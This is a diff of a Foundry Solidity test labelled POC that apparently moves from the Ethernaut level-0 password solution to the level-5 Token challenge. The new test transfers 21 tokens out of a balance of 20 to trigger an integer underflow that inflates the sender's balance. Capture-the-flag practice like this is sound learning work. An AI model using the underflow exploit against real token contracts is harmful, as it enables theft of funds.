@@ -2,16 +2,16 @@
 pragma solidity ^0.6.0;
 
 import "forge-std/Test.sol";
-import "../src/level0.sol";
+import "../src/level5.sol";
 
 contract POC is Test {
-    Instance level0 = new Instance("ethernaut0");
+    Token level5 = new Token(20);
 
     function test() external {
         vm.startBroadcast();
 
-        level0.password();
-        level0.authenticate(level0.password());
+        level5.transfer(address(0), 21);
+        level5.balanceOf(msg.sender);
 
         vm.stopBroadcast();
     }
